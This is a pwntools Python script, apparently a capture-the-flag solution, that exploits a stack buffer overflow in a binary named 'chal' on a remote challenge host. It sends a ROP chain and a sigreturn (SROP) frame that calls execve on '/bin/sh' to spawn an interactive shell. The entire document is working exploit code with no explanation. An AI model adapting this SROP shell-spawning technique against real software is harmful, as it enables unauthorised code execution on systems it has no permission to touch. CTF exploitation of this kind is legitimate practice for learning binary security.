#!/usr/bin/python3
from pwn import *
import time

context.arch = 'amd64'
exe = './chal'

if args.REMOTE:
    p = remote('challenge.secso.cc', 8003)   
else:
    p = process(exe)



context.terminal = ['tmux', 'splitw', '-h']
l = context.binary = ELF(exe, checksec=False)


frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x404f00
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401040
frame.rsp = 0x404fff

payload = b'A' * 12
payload += p64(0x404a08)
payload += p64(l.symbols['_dl_locate_static_clone'])
payload += p64(0x404f00)
payload += p64(0x401040)
payload += p64(l.symbols['_dl_locate_static_clone'])
payload += p64(0x404a00)
payload += p64(0x401040)
payload += p64(l.symbols['main'])



p.sendline(payload)
time.sleep(0.5)
p.send(b'/bin/sh')
time.sleep(0.5)
p.sendline(p64(0x401040) + bytes(frame))


payload = b'A' * 12
payload += p64(0x4049f8)
payload += p64(l.symbols['_dl_locate_static_clone'])
payload += p64(0x401040)
payload += p64(0x401040)
payload += p64(l.symbols['main']+37)

time.sleep(0.5)
p.sendline(payload)
time.sleep(0.5)
p.send(b'\xf8')



p.interactive()


